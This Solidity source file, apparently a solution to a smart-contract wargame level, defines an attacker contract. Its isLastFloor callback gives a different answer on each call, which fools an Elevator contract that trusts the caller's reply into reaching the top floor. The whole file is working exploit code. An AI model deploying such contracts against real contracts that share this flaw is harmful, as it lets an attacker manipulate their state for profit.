// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker {
    IElevator public instance;
    bool reentered;

    constructor(address _instance) public {
        instance = IElevator(_instance);
    }

    function attack() public payable {
        instance.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (reentered) return true;
        reentered = true;
        return false;
    }
}
